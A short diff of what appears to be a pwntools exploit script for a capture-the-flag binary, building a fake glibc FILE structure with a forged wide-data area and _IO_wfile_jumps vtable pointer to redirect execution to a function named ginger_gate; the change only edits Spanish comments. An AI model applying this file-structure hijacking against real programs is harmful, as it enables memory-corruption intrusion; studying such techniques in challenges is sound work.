@@ -88,11 +88,11 @@ fake_fp += flat(0x3) + flat(0x0) * 2
 fake_fp += flat(heap + 0x380) + flat(0xffffffffffffffff)
 fake_fp += flat(0x0) + flat(heap+0x390)
 fake_fp += flat(0x0) * 6  + flat(libc.sym['_IO_wfile_jumps'] + 0x8)
-fake_fp += flat(0x0) + flat(0x0) # aqui el falso doallocate
+fake_fp += flat(0x0) + flat(0x0)
 #empieza el _Widedata
 fake_fp += flat(0x0) * 3 # los _IO_read
 fake_fp += flat(0x0) * 3 # los _IO_write
-fake_fp += flat(0x0) * 3 # los _IO_buf y relleno hasta vltable
+fake_fp += flat(0x0) * 3 # los _IO_buf y relleno hasta vtable
 fake_fp += flat(0xdeadbeef) * 17
 fake_fp += flat(exe.sym.ginger_gate) + flat(0xdeadbeef)
 fake_fp += flat(heap + 0x460 - 0x68)[:7]
